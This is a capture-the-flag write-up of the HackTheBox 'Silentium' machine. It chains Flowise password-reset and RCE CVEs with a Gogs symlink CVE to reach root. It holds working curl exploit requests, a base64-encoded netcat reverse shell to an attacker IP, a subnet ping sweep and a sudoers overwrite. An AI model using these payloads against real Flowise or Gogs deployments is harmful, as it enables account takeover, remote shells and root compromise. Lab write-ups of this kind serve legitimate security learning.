# HackTheBox Silentium Full Chain Penetration Testing

## External Reconnaissance and Service Identification
- Vhost enumeration, revealed `staging.silentium.htb` leading to the `Flowise Ai` login panel
- Valid user identification via web common enumeration
## CVE-2025-58434 Exploitation and Initial Access
    curl -X POST http://staging.silentium.htb/api/v1/account/forgot-password  -H "Content-Type: application/json" -d '{"user": {"email": "ben@silentium.htb"}}'
## API returned TempToken, used for later unauthorized password reset
    curl -X POST http://staging.silentium.htb/api/v1/account/reset-password \
    -H "Content-Type: application/json" \
    -d '{
      "user": {
        "email": "ben@silentium.htb",
        "tempToken": "[TOKEN]",
        "password": "Qwerty12345."
      }
    }'
## (RCE) CVE-2025-59528 executed as intended.
Previously prepared Sleep Test injection resulted in delayed server response, proving it as vulnerable, which allowed for further exploitation.

## Reverse shell execution
Executing reverse shell via `/bin/sh` resulted in connection with api endpoint with root privileges inside Docker container.
    
        curl -v -X POST http://staging.silentium.htb/api/v1/node-load-method/customMCP \
          -H "Content-Type: application/json" \
          -H "Authorization: Bearer hWp_8jB76zi0VtKSr2d9TfGK1fm6NuNPg1uA-8FsUJc" \
          -d @payload.json
        

### payload.json content
File containing reverse shell encoded in base64 to reduce Node interpreter troubles
  
        {
          "loadMethod": "listActions",
          "inputs": {
            "mcpServerConfig": "({x:(function(){const cp = process.mainModule.require(\"child_process\");cp.execSync(\"echo -n     'bWtmaWZvIC90bXAvZjsgbmMgMTAuMTAuMTUuMTM1IDgwODAgMDwvdG1wL2YgfCBzaCAtaSAyPiYxIHwgdGVlIC90bXAvZg==' |base64 -d |sh\");return 1;})()})"
          }
        }
# Docker container enumeration and lateral movement
## Docker network enumeration:
- `ip route` -> 172.18.0.1 default gateway
- `ip a` -> 172.18.0.2 as current contaier
- Revealing other addresses in subnet and saving outcome to the `/tmp/scan`:

      `for i in $(seq 1 254); do (ping -c 1 -W 1 172.18.0.$i >/dev/null && echo "Alive: 172.18.0.$i" >> /tmp/scan) & done`
Entire subnet scan led to identification only 172.18.0.3 as working address

## Environmental variables
`env` revealed Ben password, saved as `$Password_smtp`, which was used to login via ssh

## Further lateral movement outside Docker container
- Retrieving flag from `user.txt`
- `ss -tulpn` revealed working `3000` and `3001` ports on `127.0.0.1` which became next attack point
- `ps aux` revealed Gogs working with root privileges, which became next attack target
- `/opt/gogs/gogs/gogs --version` resulted in revealing `Gogs version 0.13.3`
  
# CVE-2025-8110 (Improper Symbolic link handling)
- Preparing symbolic link and pushing it on the server.

        ln -s /etc/sudoers.d/ben
- Generating valid API key used in further exploitation
- Overwriting symbolic link with malicious content of `ben ALL=(ALL) NOPASSWD: ALL` encoded with base64 resulting in arbitrary file write as root on `/etc/sudoers.d/ben` file

      curl -X PUT "http://127.0.0.1:7777/api/v1/repos/ben_hacker/new_repo/contents/link" \
      -H "Authorization: token c53bb88b9b987bd7a1dce48d5878aa612138bab8" \
      -H "Content-Type: application/json" \
      -d '{
        "message": "update payload",
        "content": "YmVuIEFMTD0oQUxMKSBOT1BBU1NXRDogQUxMCg=="
      }'
  Outcome was full sudo privileges, proved with `sudo -l`

      User ben may run the following commands on silentium:
        (ALL) NOPASSWD: ALL
- Successfully retrieved flag from /root/root.txt
